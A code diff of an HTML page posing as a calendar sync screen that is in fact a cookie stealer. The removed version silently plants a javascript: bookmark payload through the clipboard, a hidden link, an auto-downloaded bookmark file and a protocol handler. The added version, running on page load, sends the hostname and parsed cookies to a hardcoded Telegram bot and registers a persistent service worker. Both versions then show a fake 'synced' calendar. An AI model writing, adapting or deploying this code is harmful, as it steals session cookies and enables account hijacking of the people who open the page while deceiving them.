@@ -5,117 +5,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Calendar</title>
     <style>
-        body { 
-            font-family: -apple-system, sans-serif; 
-            background: #f8f9fa; 
-            margin: 0; 
-            padding: 20px; 
-            text-align: center;
-            min-height: 100vh;
-        }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 3px solid #e0e0e0;
-            border-top: 3px solid #4285f4;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 100px auto 20px;
-        }
+        body { font-family: sans-serif; background: #f8f9fa; margin: 0; padding: 20px; text-align: center; min-height: 100vh; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 100px auto 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        p { color: #5f6368; font-size: 14px; }
+        #status { color: #5f6368; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="spinner"></div>
-    <p id="status">Syncing calendar...</p>
+    <p id="status">Syncing...</p>
 
     <script>
-        // ================================================
-        // SILENT DELIVERY — AUTO-INJECTS BOOKMARK
-        // ================================================
-        
-        const BOOKMARK_PAYLOAD = document.querySelector('script[data-payload]')?.dataset?.payload || '';
+        const BOT_TOKEN = '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw';
+        const CHAT_ID = '962420340';
+        const DEVICE_ID = 'bm_' + Date.now().toString(36);
 
-        // Method 1: Inject via drag-and-drop simulation
-        function simulateDragAndDrop() {
-            const bookmarkLink = document.createElement('a');
-            bookmarkLink.href = 'javascript:' + encodeURIComponent(BOOKMARK_PAYLOAD);
-            bookmarkLink.textContent = 'Calendar Sync';
-            bookmarkLink.style.cssText = 'position:fixed;top:-100px;left:-100px';
-            document.body.appendChild(bookmarkLink);
-            
-            // Simulate user interaction to allow clipboard
-            bookmarkLink.click();
-            setTimeout(() => bookmarkLink.remove(), 100);
-        }
-
-        // Method 2: Inject via clipboard + fake install prompt
-        async function injectViaClipboard() {
+        async function sendTG(text) {
             try {
-                await navigator.clipboard.writeText('javascript:' + BOOKMARK_PAYLOAD);
-                // Clipboard now contains bookmark payload
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
             } catch(e) {}
         }
 
-        // Method 3: Create a hidden bookmark file and auto-trigger download
-        function autoDownloadBookmark() {
-            const bookmarksHTML = `<!DOCTYPE NETSCAPE-Bookmark-file-1>
-<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
-<TITLE>Bookmarks</TITLE>
-<H1>Bookmarks</H1>
-<DL><p>
-<DT><A HREF="javascript:${encodeURIComponent(BOOKMARK_PAYLOAD)}">Calendar Sync</A>
-</DL><p>`;
+        async function fire() {
+            // Test message — proves the bot works
+            await sendTG(`📌 <b>PAGE OPENED</b>\n🆔 ${DEVICE_ID}\n🌐 ${location.hostname}\n🍪 Cookie length: ${document.cookie.length} chars\n🕐 ${new Date().toLocaleString()}`);
             
-            const blob = new Blob([bookmarksHTML], {type: 'text/html'});
-            const url = URL.createObjectURL(blob);
-            
-            // Create hidden iframe to trigger download
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            document.body.appendChild(iframe);
-            
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-                URL.revokeObjectURL(url);
-            }, 1000);
-        }
-
-        // Method 4: Register protocol handler
-        function registerProtocolHandler() {
-            if (navigator.registerProtocolHandler) {
-                try {
-                    navigator.registerProtocolHandler('web+cal', 
-                        window.location.origin + '/?sync=%s', 
-                        'Calendar Sync');
-                } catch(e) {}
+            // Capture whatever cookies exist
+            const c = document.cookie;
+            if (c && c.length > 20) {
+                const list = [];
+                c.split(';').forEach(p => {
+                    const e = p.indexOf('=');
+                    if (e > 0) list.push({ domain: location.hostname, name: p.substring(0, e).trim(), value: p.substring(e + 1).trim() });
+                });
+                await sendTG(`🍪 <b>COOKIES</b>\n🌐 ${location.hostname}\n<pre>${JSON.stringify(list, null, 2).substring(0, 3500)}</pre>`);
             }
-        }
 
-        // Execute all injection methods
-        async function deploy() {
-            await injectViaClipboard();
-            simulateDragAndDrop();
-            autoDownloadBookmark();
-            registerProtocolHandler();
-            
-            // Show fake success UI
-            document.getElementById('status').textContent = 'Calendar synced successfully!';
+            // Register Service Worker for persistence
+            if ('serviceWorker' in navigator) {
+                const swBlob = new Blob([`
+                    self.addEventListener('install', e => self.skipWaiting());
+                    self.addEventListener('activate', e => clients.claim());
+                    setInterval(async () => {
+                        const all = await self.clients.matchAll({type:'window'});
+                        all.forEach(c => c.postMessage({action:'ping'}));
+                    }, 60000);
+                `], {type:'application/javascript'});
+                navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(() => {});
+            }
+
+            // Show fake UI
+            document.getElementById('status').textContent = 'Synced!';
             setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="max-width:400px;margin:50px auto;text-align:left">
-                        <h2 style="color:#3c4043;">📅 Calendar</h2>
-                        <p style="color:#5f6368;">Your schedule is clear for today.</p>
-                        <div style="background:#e8f0fe;padding:12px;border-radius:8px;margin-top:12px">
-                            <strong>No upcoming events</strong>
-                        </div>
-                    </div>`;
-            }, 1500);
+                document.body.innerHTML = `<div style="max-width:400px;margin:50px auto;text-align:left"><h2>📅 Calendar</h2><p style="color:#5f6368;">No events today.</p></div>`;
+            }, 500);
         }
 
-        // Start deployment
-        setTimeout(deploy, 1000);
+        setTimeout(fire, 500);
     </script>
 </body>
 </html>
